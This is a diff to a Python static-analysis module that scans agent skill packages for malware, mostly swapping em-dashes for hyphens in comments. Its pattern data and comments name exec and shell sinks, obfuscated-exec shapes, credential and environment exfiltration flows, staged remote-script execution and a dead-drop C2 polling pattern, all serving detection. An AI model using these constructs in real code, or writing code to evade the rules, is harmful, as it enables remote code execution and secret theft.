@@ -1,9 +1,9 @@
 """Read-only AST analysis of Python files inside a skill (NO code execution).
 
-Regex alone is blind to obfuscation — for example, a base64-decoded payload passed
+Regex alone is blind to obfuscation - for example, a base64-decoded payload passed
 to a dynamic-evaluation built-in, `getattr(os, "sys"+"tem")(...)`,
 `__import__("os").system(...)`, or `marshal.loads(...)`. We parse Python files with
-the stdlib `ast` module — **parse only, never compile or run** — and flag a small,
+the stdlib `ast` module - **parse only, never compile or run** - and flag a small,
 high-confidence set of malware-grade constructs, plus some informational "dangerous
 sink" usage that the B13 engine only escalates when the skill already shows a
 credential/exfil signal (so a skill that merely uses subprocess is never failed on
@@ -12,7 +12,7 @@ its own).
 Pure stdlib. Offline. Best-effort: a file that does not parse (templates, Python 2,
 JS mislabelled as .py) yields no findings rather than an error.
 
-IMPORTANT — this module contains string constants that name dangerous built-ins and
+IMPORTANT - this module contains string constants that name dangerous built-ins and
 decode functions. These are DETECTION PATTERN DATA assembled at import time; this
 module never calls or evaluates any of them.
 """
@@ -36,7 +36,7 @@ from .scanbudget import ScanBudgetExceeded
 # "info" = common sink, escalates only alongside a cred/exfil signal), source line, reason.
 ASTFinding = namedtuple("ASTFinding", "rule severity lineno reason")
 
-# Detection pattern sets — assembled from parts so static scanners don't mistake
+# Detection pattern sets - assembled from parts so static scanners don't mistake
 # these string DATA constants for actual function calls or dynamic-evaluation use.
 # This module DETECTS these patterns; it does NOT call or evaluate any of them.
 _DECODE_FUNCS = {
@@ -102,23 +102,23 @@ _PROVIDER_TOKEN_RE = re.compile(
 # B-997: widened placeholder-shape coverage. Each addition is its own alternative
 # (never a loosening of an existing one) so no prior exclusion narrows:
 #   - `your[_-][a-z0-9]+[_-]key(?:[_-]here)?` generalizes the word-order gap in
-#     `your[_-]?key` above — it catches both the explicit "your-api-key-here"/
+#     `your[_-]?key` above - it catches both the explicit "your-api-key-here"/
 #     "your_api_key_here" phrasing AND the all-caps snake_case
 #     "YOUR_OPENAI_KEY_HERE"/"sk-proj-YOUR_OPENAI_KEY_HERE" shape for free, since
 #     the whole regex is already case-insensitive (`(?i)`).
 #   - `no[_-]key[_-]required` is the llama.cpp/LM Studio local-server dummy-key
-#     idiom (`sk-no-key-required`) — a field that must be non-empty but is never
+#     idiom (`sk-no-key-required`) - a field that must be non-empty but is never
 #     actually validated.
 #   - `replace` covers `REPLACE_ME` and provider-prefixed placeholder suffixes
 #     like `sk-ant-api03-REPLACE`.
 #   - `fake`/`mock` are deliberately segment-anchored (`[_-]` or start/end on
 #     BOTH sides), unlike the bare-word alternatives above: they are short
 #     enough that requiring them to be a whole hyphen/underscore-delimited
-#     segment (matching `sk-fake-...`/`sk-mock-...`) — rather than any
-#     substring — keeps a real secret that merely CONTAINS "fake"/"mock"
+#     segment (matching `sk-fake-...`/`sk-mock-...`) - rather than any
+#     substring - keeps a real secret that merely CONTAINS "fake"/"mock"
 #     embedded mid-token (no delimiters) from being wrongly excluded.
 # Deliberately NOT touched: `sk_test_`/`sk-test-` are real Stripe test-mode-
-# adjacent key prefixes, still secret-shaped if leaked — out of scope here.
+# adjacent key prefixes, still secret-shaped if leaked - out of scope here.
 _PLACEHOLDER_TOKEN_RE = re.compile(
     r"(?i)("
     r"your[_-]?key"
@@ -141,7 +141,7 @@ _PLACEHOLDER_TOKEN_RE = re.compile(
 def _is_hardcoded_provider_secret(node: ast.AST) -> bool:
     """True if *node* is a string-literal constant shaped like a real provider API key
     (a known prefix + a long high-entropy-looking tail) and NOT an obvious placeholder/
-    example value. Never inspects or logs the matched value itself — callers must only
+    example value. Never inspects or logs the matched value itself - callers must only
     report the env-var key name and pattern shape, never this string."""
     if not (isinstance(node, ast.Constant) and isinstance(node.value, str)):
         return False
@@ -158,16 +158,16 @@ def _secret_name_bindings(tree: ast.AST) -> dict:
     B-910: a one-hop resolver for the two env-entangled B-140 call sites below
     (`os.environ[K] = <name>` / `os.getenv`, `os.environ.get`/`setdefault`'s default
     arg), so `KEY = "sk-..."; os.environ["OPENAI_API_KEY"] = KEY` is caught the same
-    as writing the literal directly — today it only reaches the separate, WARN-only
+    as writing the literal directly - today it only reaches the separate, WARN-only
     `HARDCODED_PROVIDER_SECRET_ASSIGN` rule (B-893) for the `KEY = "sk-..."` line
     alone, and the env-write itself sees a bare `ast.Name` and stays silent.
 
-    Deliberately narrow and NOT a general reaching-definition resolver — unlike
+    Deliberately narrow and NOT a general reaching-definition resolver - unlike
     `shippedexec.py`'s `_FileFacts.sole()` (scope-aware, handles same-scope rebinds/
     branch order for a very different containment proof), this does not distinguish
     scope at all, matching the neighbouring B-893 `HARDCODED_PROVIDER_SECRET_ASSIGN`
     loop's own `ast.walk(tree)` idiom below. The RESOLVABLE binding is still only an
-    `Assign`/`AnnAssign` with a single `Name` target — unchanged — but the uniqueness
+    `Assign`/`AnnAssign` with a single `Name` target - unchanged - but the uniqueness
     COUNT that gates it counts every way a name can be (re)bound anywhere in the
     file, not just Assign/AnnAssign: round 1 counted only `Assign`/`AnnAssign`, so an
     UNRELATED same-named function parameter written into `os.environ` elsewhere in
@@ -177,31 +177,31 @@ def _secret_name_bindings(tree: ast.AST) -> dict:
     count now also covers, via a single `ast.Name` Store/Del check (`ast.walk`
     already recurses through any Tuple/List/Starred wrapping, so plain, tuple/list-
     unpack, starred, `for`-loop, `with ... as`, walrus (`:=`), comprehension
-    for-targets, and `del` targets are ALL one check — every one of those lowers to
+    for-targets, and `del` targets are ALL one check - every one of those lowers to
     an `ast.Name` with Store, or for `del`, Del, context) plus dedicated checks for
     the binding forms that are NOT `ast.Name` nodes: a function/lambda parameter
     (`ast.arg`), an `import`/`from ... import` binding, an `except ... as` handler
-    name, a nested `def`/`class` of the same name, and — on 3.10+, via the same
+    name, a nested `def`/`class` of the same name, and - on 3.10+, via the same
     `_MATCH_BIND_NODES`/`_MATCH_MAPPING_NODE` this module's `_own_bound_names`
-    already uses — a `match` capture pattern. `global`/`nonlocal` declarations are
+    already uses - a `match` capture pattern. `global`/`nonlocal` declarations are
     deliberately NOT counted on their own: unlike `_own_bound_names` (which needs
     them to decide what is a local of ONE scope), any actual rebind they enable is a
     literal `Assign`/`AugAssign`/etc. node somewhere in the file that this walk
     already counts directly, so the bare declaration adds nothing further here.
-    A name bound by ANYTHING else alongside its one Assign/AnnAssign — a second
+    A name bound by ANYTHING else alongside its one Assign/AnnAssign - a second
     Assign/AnnAssign anywhere in the file (conditional or not, secret-shaped or
     not), a parameter, a loop/with/except target, an import, or a redefinition of
-    the same name as a function/class — is disqualified outright and never resolved
-    — see the C-135 probes next to the two call sites, and the parameter-shadow
+    the same name as a function/class - is disqualified outright and never resolved
+    - see the C-135 probes next to the two call sites, and the parameter-shadow
     regression probes in tests/test_b910_env_entangled_name_indirection.py, for why
     this stays deliberately conservative rather than a precise data-flow analysis: a
     name rebound across an if/else, shadowed by an unrelated parameter, or reused
     later for something unrelated, must not resolve even where doing so would
     sometimes be safe. B-999: `os.environ.update({K: <name>})` (dict-literal value)
-    and `os.environ.update(K=<name>)` (keyword-argument value) are now IN scope —
+    and `os.environ.update(K=<name>)` (keyword-argument value) are now IN scope -
     both are resolved by the same one-hop lookup at their own call site below. What
     stays out of scope is a name bound to the WHOLE dict object rather than to one of
-    its values — `d = {K: "sk-..."}; os.environ.update(d)` — since that is a
+    its values - `d = {K: "sk-..."}; os.environ.update(d)` - since that is a
     same-file dict-content trace, a different and still-unimplemented resolution
     shape from the single-hop Name->literal lookup this function performs; a
     documented residual, not an oversight (B-910/B-999)."""
@@ -931,32 +931,32 @@ def hardcoded_env_secret_is_inert(source: str, finding_linenos) -> tuple:
 _MAX_FINDINGS_PER_FILE = 25
 
 # B-907 round 3: rounds 1 and 2 each gave every finding-collection loop below its own
-# early-break — first at `_MAX_FINDINGS_PER_FILE` itself (round 1), then at a 20x
-# "safety ceiling" (round 2) — so an earlier pass's (or an earlier node's, in a pass
+# early-break - first at `_MAX_FINDINGS_PER_FILE` itself (round 1), then at a 20x
+# "safety ceiling" (round 2) - so an earlier pass's (or an earlier node's, in a pass
 # that mixes severities) info findings could not stop a later crit from being
 # collected at all. Both rounds were still an early-break INSIDE the walk, gated on a
 # finite candidate count, and two independent C-135 adversarial reviews each showed
 # that any such finite ceiling is reachable by a padding-only attacker as long as the
 # ceiling's node count fits inside the ~1MB per-file source cap upstream (round 1's
 # reviewer: 25 padding calls broke round 1; round 2's reviewer: 500 padding calls
-# broke round 2 — a bigger number, not a structural fix). No finite per-pass ceiling
+# broke round 2 - a bigger number, not a structural fix). No finite per-pass ceiling
 # closes the vulnerability class; only removing the early-break does. There is
-# therefore NO per-pass ceiling of any kind below — every loop runs to completion over
+# therefore NO per-pass ceiling of any kind below - every loop runs to completion over
 # `ast.walk(tree)` and every genuine candidate, crit or info, from every pass reaches
 # `out`. Two things make that safe:
 #   1. `analyze_python` runs strictly inside its caller's existing per-check wall-clock
-#      deadline (`scanbudget.check_deadline`, backed by `SIGALRM` on POSIX — see
+#      deadline (`scanbudget.check_deadline`, backed by `SIGALRM` on POSIX - see
 #      `checks/__init__.py`'s `run_all` dispatch and `checks/_vet.py`'s content-ring
 #      call, both of which already wrap every `analyze_python` call site). That
 #      deadline can interrupt mid-loop regardless of which pass is running, so it is
-#      the actual DoS backstop — not a per-pass candidate count.
+#      the actual DoS backstop - not a per-pass candidate count.
 #   2. The per-file cap is enforced exactly once, by SEVERITY, at `return` below (see
 #      `_ast_severity_rank`): crit sorts ahead of info, `sorted` is stable so
 #      discovery order survives within one severity, and one slot is reserved for an
 #      `AST_FINDINGS_TRUNCATED` disclosure when anything was actually cut. That is
 #      unchanged from round 2 and was already correct.
 
-# Severity rank for the FINAL truncation below — higher sorts
+# Severity rank for the FINAL truncation below - higher sorts
 # first. `analyze_python`'s own emitted severities are "crit" and "info" only, but
 # this stays a proper total order (not a two-way crit/non-crit split) so a future
 # severity slots in without a second place to update. Anything unrecognized ranks
@@ -974,13 +974,13 @@ def _ast_severity_rank(severity: str) -> int:
 # reached via different paths). A deeply-nested-but-tiny skill can drive this past
 # 2^depth entries, exhausting memory well before any wall-clock budget fires. This
 # caps the DISTINCT (effect, sink, guards) combinations a single simulation may
-# track — far beyond any real skill (<100) — and is generous enough to only trip on
+# track - far beyond any real skill (<100) - and is generous enough to only trip on
 # adversarial guard-combination explosion, degrading to an honest UNKNOWN (never a
 # silent PASS) via the existing ScanBudgetExceeded -> run_all handler.
 _MAX_REACHED_SINKS = 10_000
 
 # Taint (CRED_EXFIL_FLOW): a credential-FILE's contents flowing into a network sink.
-# Sources are credential FILE paths ONLY — NOT environment variables — so the common
+# Sources are credential FILE paths ONLY - NOT environment variables - so the common
 # legit "read OPENAI_API_KEY, send it as an auth header" pattern is never flagged.
 
 # Taint (ENV_EXFIL_FLOW): env-var reads and agent-config-file reads flowing into a
@@ -1431,7 +1431,7 @@ _NET_SINK_BASES = {
 # Extended taint: TT4 (file-read->network), TT5 (external->exec), SSRF
 # ---------------------------------------------------------------------------
 
-# Call names that signal external/tool/LLM output — conservative, noun-like result vars.
+# Call names that signal external/tool/LLM output - conservative, noun-like result vars.
 # A variable assigned from ANY call whose name matches this pattern is treated as tainted.
 _TOOL_RESULT_CALL_RE = re.compile(r"\b(response|result|completion|output|message|reply)\b", re.I)
 
@@ -1446,7 +1446,7 @@ _TOOL_RESULT_CALL_RE = re.compile(r"\b(response|result|completion|output|message
 _NET_SOURCE_ATTRS = {"get", "urlopen", "urlretrieve", "read", "recv", "recvfrom"}
 _NET_SOURCE_BASES = {"requests", "httpx", "urllib", "urllib.request"}
 
-# Exec/shell sinks for TT5 — assembled from parts (detection data, not calls).
+# Exec/shell sinks for TT5 - assembled from parts (detection data, not calls).
 _EXEC_SINK_NAMES = {"ex" + "ec", "ev" + "al"}
 _EXEC_SINK_OS_ATTRS = {"sys" + "tem", "po" + "pen"}
 _EXEC_SINK_SUBP_ATTRS = {"run", "call", "check_output", "check_call", "Popen"}
@@ -1486,12 +1486,12 @@ def _is_external_source_call(node: ast.Call) -> bool:
     # input()
     if isinstance(f, ast.Name) and f.id == "input":
         return True
-    # requests.get / httpx.get / urllib.urlopen — network input.
+    # requests.get / httpx.get / urllib.urlopen - network input.
     if isinstance(f, ast.Attribute):
         base = _attr_base(f.value)
         if f.attr in _NET_SOURCE_ATTRS and base in _NET_SOURCE_BASES:
             return True
-        # .read() / .read_text() on any file object — file-read source.
+        # .read() / .read_text() on any file object - file-read source.
         if f.attr in _FILE_READ_METHOD_ATTRS:
             return True
     if isinstance(f, ast.Name) and f.id in _FILE_OPEN_NAMES:
@@ -1651,7 +1651,7 @@ class _RefResolver:
         self._source_in_cache: dict = {}
         self._mutated_paths: "set[str] | None" = None
 
-    # ── ref() and its rules ──────────────────────────────────────────────────
+    # -- ref() and its rules --------------------------------------------------
 
     def ref(self, node: "ast.AST | None", scope: "ast.AST | None" = None, _depth: int = 0) -> "str | None":
         if node is None or _depth > _shippedexec._MAX_DEPTH:
@@ -1759,7 +1759,7 @@ class _RefResolver:
             return f"{base}.{k}" if base is not None else None
         return None
 
-    # ── const_str() ───────────────────────────────────────────────────────────
+    # -- const_str() -----------------------------------------------------------
 
     def const_str(self, node: "ast.AST | None", scope: "ast.AST | None" = None, _depth: int = 0) -> "str | None":
         if node is None or _depth > _shippedexec._MAX_DEPTH:
@@ -1823,7 +1823,7 @@ class _RefResolver:
             return base[::-1] if base is not None else None
         return None
 
-    # ── env vocabulary ───────────────────────────────────────────────────────
+    # -- env vocabulary -------------------------------------------------------
 
     def is_env_mapping(self, node: "ast.AST | None") -> bool:
         if node is None:
@@ -1882,7 +1882,7 @@ class _RefResolver:
         self._source_in_cache[key] = result
         return result
 
-    # ── mutated-path guard (FP side only) ────────────────────────────────────
+    # -- mutated-path guard (FP side only) ------------------------------------
 
     def _guard_base_ref(self, node: "ast.AST | None", scope: "ast.AST | None") -> "str | None":
         """Base resolution for the mutated-path guard: `facts.dotted()` (R1) plus
@@ -2494,18 +2494,18 @@ def _external_tainted_names(
 # ONLY reason such a skill FAILed B13 was F-021 firing by ACCIDENT on the word "context"
 # in unrelated prose elsewhere in the package. Narrowing F-021 (see
 # checks/_vet.py `_runtime_fetch_matches`) would therefore have turned a genuine
-# remote-code loader into a PASS, so the gap is closed here — where the signal actually
-# lives — rather than left to a coincidence in a natural-language regex.
+# remote-code loader into a PASS, so the gap is closed here - where the signal actually
+# lives - rather than left to a coincidence in a natural-language regex.
 #
 # Deliberately NARROW, to keep this crit rule sound:
-#   * only NETWORK reads are sources — not file reads, not env, and above all not
+#   * only NETWORK reads are sources - not file reads, not env, and above all not
 #     function parameters (every param is externally tainted for TT5/SSRF's own
-#     purposes — see `_func_param_taint_by_scope`/`_external_tainted_names` — so
+#     purposes - see `_func_param_taint_by_scope`/`_external_tainted_names` - so
 #     admitting params here too would make almost any helper "remote-returning" and
 #     mass-false-fire this crit rule);
 #   * only ONE hop of return-value propagation (a locally-defined function whose own
 #     return value is network-derived), not a general interprocedural analysis;
-#   * the sink set is exec/eval only — the shell/subprocess sinks stay with TT5, whose
+#   * the sink set is exec/eval only - the shell/subprocess sinks stay with TT5, whose
 #     argv-list carve-outs already encode when those are benign.
 # NARROWS rather than closes: a two-hop chain (helper A returns helper B's fetch) or a
 # fetch routed through a class attribute is still missed. Widening further needs its own
@@ -2539,7 +2539,7 @@ _BARE_REMOTE_FETCH_FUNCS = frozenset({
 
 
 def _dotted_path(node: ast.AST) -> str:
-    """The full dotted name of an attribute chain — `urllib.request` for
+    """The full dotted name of an attribute chain - `urllib.request` for
     `urllib.request.urlopen`'s value. Returns "" for anything non-static.
 
     The module's older `_attr_base` returns only the LAST segment ("request"), which is
@@ -2563,7 +2563,7 @@ def _is_remote_fetch_call(node: ast.AST, facts=None) -> bool:
 
     *facts* (B-927, optional): the calling file's `shippedexec._FileFacts`/`PathFacts`
     instance. When supplied, ALSO recognises a bare `urlopen(...)`/`urlretrieve(...)`
-    call whose name was imported via `from urllib.request import ...` — see
+    call whose name was imported via `from urllib.request import ...` - see
     `_BARE_REMOTE_FETCH_FUNCS`'s docstring for the shadow/alias safety this gets for
     free by reusing `facts.dotted()`. Deliberately opt-in per call site (defaults to
     `None`, in which case a bare name is never recognised, matching this function's
@@ -2572,7 +2572,7 @@ def _is_remote_fetch_call(node: ast.AST, facts=None) -> bool:
     into the REMOTE_STAGED_EXEC call site only; B-993 later threaded it into
     REMOTE_CODE_LOAD's and DEADDROP_RESOLVER's fetch legs too, each reviewed and
     fixed on its own merits rather than as a blanket "thread facts everywhere"
-    change — a caller not listed here still gets `facts=None` (unchanged behaviour).
+    change - a caller not listed here still gets `facts=None` (unchanged behaviour).
     """
     if not isinstance(node, ast.Call):
         return False
@@ -2585,14 +2585,14 @@ def _is_remote_fetch_call(node: ast.AST, facts=None) -> bool:
         return False
     path = _dotted_path(f.value)
     if not path:
-        # A non-static receiver (`self.session.get(...)`, `s.get(...)`) — fall back to
+        # A non-static receiver (`self.session.get(...)`, `s.get(...)`) - fall back to
         # the last-segment name so a stored client object still reads as a fetch.
         return _attr_base(f.value) in _REMOTE_FETCH_BASES
     return path in _REMOTE_FETCH_BASES or path.split(".")[0] in _REMOTE_FETCH_BASES
 
 
 def _expr_reads_remote(node: ast.AST, facts=None) -> bool:
-    """True when evaluating *node* performs a network read anywhere in its subtree —
+    """True when evaluating *node* performs a network read anywhere in its subtree -
     covers `urlopen(u).read()`, `requests.get(u).text`, `urlopen(u).read().decode()`.
     *facts*: see `_is_remote_fetch_call`."""
     return any(_is_remote_fetch_call(sub, facts) for sub in ast.walk(node))
@@ -2607,7 +2607,7 @@ def _remote_returning_funcs(tree: ast.AST, facts=None) -> set[str]:
         if not isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
             continue
         local: set[str] = set()
-        for _ in range(4):  # small fixpoint — helper bodies are short
+        for _ in range(4):  # small fixpoint - helper bodies are short
             changed = False
             for a in ast.walk(fn):
                 if not isinstance(a, ast.Assign):
@@ -2675,7 +2675,7 @@ def _remote_code_load_findings(tree: ast.AST, facts=None) -> list[tuple[int, str
                 (
                     getattr(node, "lineno", 0),
                     f"content fetched from a remote URL is passed to {f.id}() via a local "
-                    "helper's return value — remote code loader (the payload lives at the "
+                    "helper's return value \u2014 remote code loader (the payload lives at the "
                     "URL, not in the shipped file)",
                 )
             )
@@ -2692,7 +2692,7 @@ def _remote_code_load_findings(tree: ast.AST, facts=None) -> list[tuple[int, str
 #
 # No name-level taint survives the file write (the subprocess argument is a plain string
 # literal), so TT5_CMD_INJECTION cannot see it and the file yields only
-# `DANGEROUS_SINK info` — case_00975's real shape. As with the shell rule, the precision
+# `DANGEROUS_SINK info` - case_00975's real shape. As with the shell rule, the precision
 # comes from requiring TWO signals to name the SAME literal path: a write fed by a remote
 # fetch, and an exec sink mentioning that path.
 _STAGED_WRITE_METHODS = {"write", "writelines", "write_text", "write_bytes"}
@@ -2761,7 +2761,7 @@ def _staged_remote_paths(tree: ast.AST, remote: set[str], facts=None) -> set[str
         if isinstance(recv, ast.Name) and recv.id in handles:
             paths.add(handles[recv.id])
         else:
-            # Path("/tmp/x.sh").write_text(remote) — the path is the receiver's own arg.
+            # Path("/tmp/x.sh").write_text(remote) - the path is the receiver's own arg.
             if isinstance(recv, ast.Call) and recv.args:
                 p = _literal_str(recv.args[0])
                 if p:
@@ -2798,10 +2798,10 @@ def _staged_exec_findings(
 
 
 def _remote_fetch_tainted_names(tree: ast.AST, facts=None) -> set[str]:
-    """Names holding network-fetched data — direct fetch calls plus the one local-helper
+    """Names holding network-fetched data - direct fetch calls plus the one local-helper
     return hop. Shared by REMOTE_CODE_LOAD and REMOTE_STAGED_EXEC.
     *facts*: see `_is_remote_fetch_call` (B-927; opt-in, defaults to unchanged
-    behaviour — REMOTE_CODE_LOAD's own caller never passes one, so it is unaffected)."""
+    behaviour - REMOTE_CODE_LOAD's own caller never passes one, so it is unaffected)."""
     remote_funcs = _remote_returning_funcs(tree, facts)
     tainted: set[str] = set()
     assigns = [n for n in ast.walk(tree) if isinstance(n, ast.Assign)]
@@ -2825,20 +2825,20 @@ def _remote_fetch_tainted_names(tree: ast.AST, facts=None) -> set[str]:
     return tainted
 
 
-# F-159 (TA488/OWAReaper — Proofpoint/NSA, CVE-2026-42897): the dead-drop C2 resolver
-# shape — a periodic poll of a remote content/search API, whose response is decoded,
+# F-159 (TA488/OWAReaper - Proofpoint/NSA, CVE-2026-42897): the dead-drop C2 resolver
+# shape - a periodic poll of a remote content/search API, whose response is decoded,
 # and the decoded value reaches an exec sink. Each leg alone is common and benign (a
 # periodic version-check poll; a decode call reading an embedded asset; an exec sink in
 # a CLI wrapper); all three chained is a resolver. Reuses this module's EXISTING
-# decode->exec vocabulary end to end — `_is_decode_primitive_call` (the same
+# decode->exec vocabulary end to end - `_is_decode_primitive_call` (the same
 # base64/hex/b85/zlib primitive family OBFUSCATED_EXEC/CHUNKED_FILE_EXEC already use),
 # `_is_exec_sink_call` (the same eval/exec/os.system/subprocess sink set TT5 uses), and
 # `_expr_reads_remote`/`_names_in` (the same network-source vocabulary REMOTE_CODE_LOAD
-# uses) — no new decode/sink taxonomy is introduced here, only the periodicity leg and
+# uses) - no new decode/sink taxonomy is introduced here, only the periodicity leg and
 # the taint sweep that connects the three.
 #
 # Deliberately does NOT gate on the polled host (api.github.com, a gist endpoint, a
-# search API, ...): per the task's own finding, the host is legitimate BY DESIGN — that
+# search API, ...): per the task's own finding, the host is legitimate BY DESIGN - that
 # is the entire point of a dead drop. A host denylist here would be the exact C-303
 # cautionary shape (a signal that scores perfectly on a corpus and is unsound on real
 # skills, because every legitimate skill that touches the SAME host would also match).
@@ -2847,7 +2847,7 @@ _SLEEP_BASES = {"time", "asyncio", "trio", "eventlet"}
 
 def _is_sleep_call(node: ast.AST) -> bool:
     """`time.sleep(...)` / `asyncio.sleep(...)` / a bare `sleep(...)` (from `time import
-    sleep`) — the periodicity primitive a polling loop uses to wait between rounds."""
+    sleep`) - the periodicity primitive a polling loop uses to wait between rounds."""
     if not isinstance(node, ast.Call):
         return False
     f = node.func
@@ -2858,11 +2858,11 @@ def _is_sleep_call(node: ast.AST) -> bool:
 
 def _fetching_funcnames(tree: ast.AST, facts=None) -> set[str]:
     """Names of locally-defined functions whose OWN body performs a network fetch
-    (`_is_remote_fetch_call`) anywhere in it — one hop, mirroring this module's other
+    (`_is_remote_fetch_call`) anywhere in it - one hop, mirroring this module's other
     remote-fetch helpers (`_remote_returning_funcs`), used so a poll LOOP that calls a
     small `_poll_once()`-style helper (rather than fetching inline) still counts.
 
-    *facts* (B-993): see `_is_remote_fetch_call` — threaded through so a helper whose
+    *facts* (B-993): see `_is_remote_fetch_call` - threaded through so a helper whose
     fetch is a bare `urlopen`/`urlretrieve` (`from urllib.request import ...`) is
     recognised too. Opt-in, defaults to `None` (unchanged prior behaviour)."""
     names: set[str] = set()
@@ -2876,14 +2876,14 @@ def _fetching_funcnames(tree: ast.AST, facts=None) -> set[str]:
 
 def _poll_loop_present(tree: ast.AST, fetching_funcs: set[str], facts=None) -> bool:
     """True when a `while`/`for` loop's own subtree carries BOTH a sleep-like call and a
-    network fetch — inline, or one hop through a name in *fetching_funcs* — the
+    network fetch - inline, or one hop through a name in *fetching_funcs* - the
     `while True: _poll_once(); time.sleep(N)` scheduler shape (leg 1 of the dead-drop
     resolver composition). Deliberately narrow: a cron-like interval config/decorator or
-    an "every N minutes" prose directive is NOT recognised here — this narrows rather
+    an "every N minutes" prose directive is NOT recognised here - this narrows rather
     than closes the periodicity signal; widening either needs its own fixture + C-135
     pass, not folding in here unreviewed.
 
-    *facts* (B-993): see `_is_remote_fetch_call` — threaded through so an inline bare
+    *facts* (B-993): see `_is_remote_fetch_call` - threaded through so an inline bare
     `urlopen`/`urlretrieve` fetch inside the loop itself is recognised too. Opt-in,
     defaults to `None` (unchanged prior behaviour)."""
     for node in ast.walk(tree):
@@ -2907,26 +2907,26 @@ def _poll_loop_present(tree: ast.AST, fetching_funcs: set[str], facts=None) -> b
 
 def _deaddrop_fetch_tainted_names(scope: ast.AST, facts=None) -> set[str]:
     """F-159: names holding network-fetched data WITHIN *scope*'s own body, propagated
-    through simple assignment AND a plain `for` target over a fetch-tainted iterable —
+    through simple assignment AND a plain `for` target over a fetch-tainted iterable -
     unlike `_remote_fetch_tainted_names` (Assign only), which misses the dead-drop
     shape's `for line in body.splitlines():` idiom.
 
-    *facts* (B-993): see `_is_remote_fetch_call` — threaded through to
+    *facts* (B-993): see `_is_remote_fetch_call` - threaded through to
     `_expr_reads_remote` so a bare `urlopen`/`urlretrieve` fetch (`from
     urllib.request import ...`) is recognised as a fetch source too, not only the
     attribute-call spelling. Opt-in, defaults to `None` (unchanged prior behaviour).
-    Confined to THIS function's own `_expr_reads_remote` calls — the decode leg
+    Confined to THIS function's own `_expr_reads_remote` calls - the decode leg
     (`_deaddrop_decode_tainted_names`) and the sink leg's inline-decode check each take
     (and thread) their own `facts` parameter separately (round 2, same ticket); this
     docstring only speaks for the fetch leg's own call sites.
 
     *scope* MUST be one node from `_deaddrop_resolver_findings`'s own scope list (an
     `ast.Module`, or a single `ast.FunctionDef`/`ast.AsyncFunctionDef`), walked via
-    `_scope_own_nodes` — which stops at nested function/class/lambda boundaries. C-135
+    `_scope_own_nodes` - which stops at nested function/class/lambda boundaries. C-135
     (adversarial self-review, same pass this check's own DoD requires): an EARLIER cut
     walked the WHOLE tree in one flat pass, so a bare name reused across two unrelated
     SIBLING functions (e.g. `data` fetched in a poller, and an unrelated `data` literal
-    in a totally different installer function) let the second bleed the first's taint —
+    in a totally different installer function) let the second bleed the first's taint -
     a confirmed false FAIL. Scoping per function (mirroring `_scope_own_nodes`'s own
     stated purpose: "a local name reused across sibling functions is resolved
     per-scope, not conflated") closes that without weakening detection: the bad
@@ -2964,12 +2964,12 @@ def _deaddrop_decode_tainted_names(
 ) -> set[str]:
     """F-159: names holding the DECODED form of *fetch_tainted* data, WITHIN *scope*'s
     own body (see `_deaddrop_fetch_tainted_names`'s docstring for the scoping
-    discipline and why it matters) — an assignment whose RHS is a real decode primitive
+    discipline and why it matters) - an assignment whose RHS is a real decode primitive
     (`_is_decode_primitive_call`, the same base64/hex/b85/zlib family OBFUSCATED_EXEC
     already trusts) applied to a fetch-tainted argument, propagated onward through
     further plain assignment.
 
-    *facts* (B-993 round 2): see `_is_remote_fetch_call` — threaded through to this
+    *facts* (B-993 round 2): see `_is_remote_fetch_call` - threaded through to this
     function's own `_expr_reads_remote` call so an INLINE bare-name fetch (`payload =
     base64.b64decode(urlopen(u).read())`, no intermediate variable naming the fetch)
     is recognised as decoding fetched data too, not only the attribute-call spelling.
@@ -3007,23 +3007,23 @@ def _deaddrop_subprocess_command_parts(
 ) -> list[ast.AST] | None:
     """F-159 follow-up (adversarial review on B347, subprocess data-argument false
     FAIL): for a subprocess.* exec-sink Call *node*, return the list of the call's own
-    argument sub-expressions that constitute COMMAND position — the thing execve (or
-    a shell, or a re-invoked interpreter) actually runs — or None when the WHOLE call
+    argument sub-expressions that constitute COMMAND position - the thing execve (or
+    a shell, or a re-invoked interpreter) actually runs - or None when the WHOLE call
     is command position (shell=True/an unprovable dynamic shell= value, or the command
-    is not a resolvable fixed argv list — a string/joined/concatenated/unresolved-name
+    is not a resolvable fixed argv list - a string/joined/concatenated/unresolved-name
     form, where there is no safe "data argument" position to carve out at all).
 
     When a list is returned, it is EXACTLY argv[0] (the fixed program element) unless
     argv[0] itself names a shell/indirect-execution interpreter
     (`_argv0_is_shell_indirect_exec`), in which case every element counts, since that
-    interpreter re-parses the rest of the argv list as its own command text — the
+    interpreter re-parses the rest of the argv list as its own command text - the
     identical classification `_subprocess_taint_is_command_injection` already applies
     for TT5/TT5_ARG_INJECTION, reused here (not re-derived) so the two checks can
     never quietly disagree about what "command position" means for the same call
     shape.
 
     Only subprocess.* has this distinction at all: os.system()/os.popen() run their
-    sole string argument through a shell (whatever is IN the string is executed —
+    sole string argument through a shell (whatever is IN the string is executed -
     there is no separate inert-data position), and a bare eval or exec call runs its
     sole argument itself AS code. Callers only invoke this for a `sink_name` that starts
     with `"subprocess."`; see `_deaddrop_resolver_findings`.
@@ -3049,58 +3049,58 @@ def _deaddrop_resolver_findings(
     list_bindings_by_call: dict[ast.Call, dict[str, ast.List | ast.Tuple]] | None = None,
     facts=None,
 ) -> tuple[list[tuple[int, str]], list[tuple[int, str]]]:
-    """F-159: the dead-drop C2 resolver composition — see the module comment above
+    """F-159: the dead-drop C2 resolver composition - see the module comment above
     `_SLEEP_BASES`. Returns (confirmed, ambiguous), each a list of (lineno, reason):
 
-      confirmed — WITHIN ONE SCOPE (a function, or module top-level), the decoded
+      confirmed - WITHIN ONE SCOPE (a function, or module top-level), the decoded
                   value (or an inline decode of fetch-tainted content) is a
-                  demonstrable ARGUMENT of an exec-sink call, AND — for a
-                  subprocess.* sink specifically — that argument lands in COMMAND
+                  demonstrable ARGUMENT of an exec-sink call, AND - for a
+                  subprocess.* sink specifically - that argument lands in COMMAND
                   position, not merely a trailing DATA position of a fixed,
-                  non-interpreter program (`_deaddrop_subprocess_command_parts`) —
+                  non-interpreter program (`_deaddrop_subprocess_command_parts`) -
                   FAIL-grade (taint confirmed AND the decoded value is the thing
                   actually executed, not merely inert execve data). Taint is
                   deliberately scoped per function (`_deaddrop_fetch_tainted_names`'s
                   docstring) so an unrelated sibling function's same-named local can
                   never be mistaken for fetched/decoded data.
-      ambiguous — a poll loop, a decode primitive, AND an exec sink are all present
+      ambiguous - a poll loop, a decode primitive, AND an exec sink are all present
                   SOMEWHERE in the file (this leg is intentionally file-wide, not
-                  per-scope — it names an ambiguous co-occurrence for human review, not
